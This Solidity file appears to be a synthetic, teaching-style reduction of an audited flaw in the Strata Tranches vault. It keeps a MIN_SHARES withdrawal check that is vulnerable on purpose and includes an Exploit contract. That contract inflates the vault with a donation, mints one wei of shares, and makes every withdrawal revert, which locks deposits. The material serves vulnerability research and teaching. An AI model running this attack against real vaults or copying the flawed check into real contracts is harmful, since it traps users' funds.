// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Strata Tranches — donation-prevention MIN_SHARES can be gamed so all
    withdrawals revert and assets stick in Strategy (Cyfrin 2025-10-08, #63224)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: first depositor donates assets to Strategy (inflating
    totalAssets), then deposits tiny amount → 1 wei of shares. Subsequent
    large deposits still mint << MIN_SHARES. _onAfterWithdrawalChecks
    reverts MinSharesViolation on every withdraw → funds stuck.
    Blamed check preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @dev Strategy holds donated + deposited underlying; allows vault to pull.
contract Strategy {
    MockERC20 public immutable asset;
    address public vault;

    constructor(MockERC20 a) {
        asset = a;
    }

    function setVault(address v) external {
        vault = v;
    }

    function totalAssets() external view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function pull(address to, uint256 amt) external {
        require(msg.sender == vault, "onlyVault");
        asset.transfer(to, amt);
    }
}

/// @notice Reduced Tranche with MIN_SHARES post-withdraw check.
/// Source: Tranche._onAfterWithdrawalChecks (Strata Cyfrin 2025-10-08).
contract Tranche {
    uint256 public constant MIN_SHARES = 0.1 ether;

    MockERC20 public immutable asset;
    Strategy public immutable strategy;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    error MinSharesViolation();

    constructor(MockERC20 a, Strategy s) {
        asset = a;
        strategy = s;
    }

    function totalAssets() public view returns (uint256) {
        return strategy.totalAssets();
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        uint256 ta = totalAssets();
        // Empty vault, no donation: 1:1. Donation-before-first-deposit (or inflated):
        // shares = assets * supply / ta with ghost 1-wei supply owning donated ta
        // so assets=1.1e18, ta=1e18 → 1 share (matches finding PoC).
        if (supply == 0 && ta == 0) {
            shares = assets;
        } else if (supply == 0 && ta > 0) {
            shares = (assets * 1) / ta;
            if (shares == 0) shares = 1;
        } else {
            shares = (assets * supply) / ta;
            if (shares == 0) shares = 1;
        }
        asset.transferFrom(msg.sender, address(strategy), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        uint256 ta = totalAssets();
        shares = (assets * supply + ta - 1) / ta;
        if (shares > balanceOf[owner]) shares = balanceOf[owner];
        require(shares > 0, "0");

        totalSupply -= shares;
        balanceOf[owner] -= shares;

        uint256 out = assets;
        if (out > strategy.totalAssets()) out = strategy.totalAssets();
        strategy.pull(receiver, out);

        _onAfterWithdrawalChecks();
        return shares;
    }

    function _onAfterWithdrawalChecks() internal view {
        if (totalSupply < MIN_SHARES) {
            revert MinSharesViolation(); // @> VULN: after donation-inflation first deposits mint << MIN_SHARES, every withdraw reverts and traps Strategy assets
        }
        // FIX: seed dead shares on deploy / sweep donations before first deposit
    }
}

/// CREATE: asset(1), strategy(2), tranche(3)
contract Exploit {
    MockERC20 public asset;
    Strategy public strategy;
    Tranche public vault;

    uint256 public totalSharesAfterAttack;
    bool public withdrawReverted;

    constructor() {
        asset = new MockERC20("USDe", "USDe");
        strategy = new Strategy(asset);
        vault = new Tranche(asset, strategy);
        strategy.setVault(address(vault));
    }

    function run() external {
        address bob = address(0xB0B);

        // Step 1: Alice (this) donates 1e18 to strategy, deposits 1.1e18 → 1 share
        asset.mint(address(this), 1 ether + 1.1 ether);
        asset.transfer(address(strategy), 1 ether);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1.1 ether, address(this));
        require(vault.totalSupply() == 1, "1 wei share");

        // Step 2: Bob deposits 1_000_000e18 — totalSupply still << MIN_SHARES
        asset.mint(address(this), 1_000_000 ether);
        vault.deposit(1_000_000 ether, bob);
        totalSharesAfterAttack = vault.totalSupply();
        require(totalSharesAfterAttack < vault.MIN_SHARES(), "still under MIN_SHARES");

        // Step 3: any withdraw reverts — assets stuck in Strategy
        withdrawReverted = false;
        try vault.withdraw(10_000 ether, bob, bob) {
            revert("withdraw should fail");
        } catch {
            withdrawReverted = true;
        }
        require(withdrawReverted, "DoS withdraw");
        require(asset.balanceOf(address(strategy)) > 1_000_000 ether, "assets stuck in strategy");
    }
}
